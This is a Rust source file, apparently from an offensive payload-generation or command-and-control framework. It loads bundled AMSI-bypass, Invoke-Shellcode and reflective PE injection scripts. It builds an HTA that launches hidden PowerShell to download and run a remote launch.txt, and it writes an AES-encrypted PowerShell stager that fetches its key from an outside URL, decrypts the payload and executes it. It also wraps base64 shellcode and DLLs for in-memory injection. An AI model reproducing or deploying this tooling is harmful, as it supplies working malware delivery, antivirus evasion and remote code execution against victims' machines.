pub fn get_amsi() -> String {
    let amsi = include_bytes!("../assets/amsi-bypass.ps1");
    format!("{}", String::from_utf8_lossy(amsi))
}

pub fn get_invoke_shellcode() -> String {
    let invoke_shellcode = include_bytes!("../assets/Invoke-Shellcode.ps1");
    format!("{}", String::from_utf8_lossy(invoke_shellcode))
}

pub fn get_invoke_reflective() -> String {
    let invoke_shellcode = include_bytes!("../assets/Invoke-ReflectivePEInjection.ps1");
    format!("{}", String::from_utf8_lossy(invoke_shellcode))
}

pub fn generate_hta(url: &str) -> String {
    format!("<html><head><script>var c='C:\\\\Windows\\\\SysNative\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -noP -sta -NoExit -w 1 \"ieX((iwr {}launch.txt -usEb).Content)\"';\
    new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>", url)
}

pub fn powershell_aes_launcher(payload: &str, url: &str) -> String {
    // first part of payload
    let p1 = r#"
$key = [System.Text.Encoding]::Default.GetBytes((new-object net.webclient).downloadString(""#;
    // URL is inserted
    // load the second part of payload
    let p2 = r#"safe.txt"))
$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Key = $key
$AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$p = ""#;
    // payload is inserted
    // load third part of payload
    let p3 = r#""
$bytes = [Convert]::FromBase64String($p)
$iv = $bytes[0..15]
$AES.iv = $iv
$decryptor = $AES.CreateDecryptor()
$unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
$key = $Null
$clean = [System.Text.Encoding]::Default.GetString($unencryptedData)
iex($clean)"#;
    format!("{}{}{}{}{}", p1, url, p2, payload, p3)
}

pub fn shellcode_loader(invoker: &str, payload: &str) -> String {
    let p1 = "\n\n$sc = \"";
    let p2 = r#""
$sc = [Convert]::FromBase64String($sc)
Invoke-Shellcode -Shellcode $sc"#;
    format!("{}{}{}{}", invoker, p1, payload, p2)
}

pub fn dll_loader(invoker: &str, payload: &str) -> String {
    let p1 = "\n\n$dllLoad = \"";
    let p2 = r#""
$dllLoad = [Convert]::FromBase64String($dllLoad)
Invoke-ReflectivePEInjection -PEBytes $dllLoad"#;
    format!("{}{}{}{}", invoker, p1, payload, p2)
}
